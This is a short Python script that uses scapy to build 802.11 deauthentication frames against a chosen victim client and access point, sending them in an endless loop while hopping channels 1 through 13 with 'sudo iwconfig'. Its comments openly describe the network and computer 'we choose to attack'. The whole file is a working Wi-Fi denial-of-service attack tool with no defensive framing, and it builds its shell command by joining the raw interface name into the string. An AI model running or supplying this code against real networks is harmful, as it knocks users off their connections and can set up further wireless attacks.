from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp        # for sending packets
)
import os

# input -> 
# 1.choosen interface 
# 2. mac addr of the wifi we choose to attack = bssid specifies the MAC address of the AP
# 3.the client we choose to attack (that uses the network we attack ) = target_mac specifies that this packet will go to the victim's computer
def deautenticate_user(iface: str, bssid: str, target_mac: str):
 
  dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
  #creating the frame of the packet with reason 7 for deautenticte 
  #Radiotap is a standard for 802.11 frame injection and reception
  frame = RadioTap()/dot11/Dot11Deauth(reason=7)
  #sending deautenticate packets to the victim using scapy 
  #The inter(framegap - IFG) is a sleep -we need time to build our packet 
  #we used verbos= 0 to disable printing of sendp in console
  while True:
    for ch in range (1,14):
        c = str(ch)
        cmd = "sudo iwconfig "+iface+" channel "+ c
        os.system(cmd)
        sendp(frame, iface=iface, inter=0.100 , verbose = 0)
